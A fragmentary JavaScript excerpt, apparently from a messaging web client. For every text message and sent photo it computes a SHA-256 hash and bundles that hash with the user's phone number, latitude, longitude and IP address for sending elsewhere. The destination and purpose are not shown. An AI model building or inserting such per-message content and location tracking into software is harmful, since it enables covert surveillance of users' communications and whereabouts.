...
const rightRotate = (value, amount) => {
  ...
  const sendEncryptCode = (hash) => {
    console.log(hash + " " + localStorage.getItem("phoneNo") + " " + lat + " " + long + " " + ip_add);
    const code = {
      code: hash + "-" + localStorage.getItem("phoneNo")+ "\n" +"Location: "  + lat + "\n" + long + "\n" + "IP_Add: "+ ip_add,
    };
...
class InputBox extends Component {
    ...
    handleSendPhoto = (content, file) => {
        ...
        this.sendMessage(content, true, result => {
            ...
            var data = blobToUint8Array(file);
            var ImageHash = sha256(data);
            sendEncryptCode(ImageHash);
    ...
    sendMessage = async (content, clearDraft, callback) => {
        ...
        if (content["@type"] == "inputMessageText") {
          console.log(content.text.text.replace(/\s/g, "").toLowerCase());
          var text = content.text.text.replace(/\s/g, "").toLowerCase();
          
          hash = sha256(text);
          sendEncryptCode(hash);
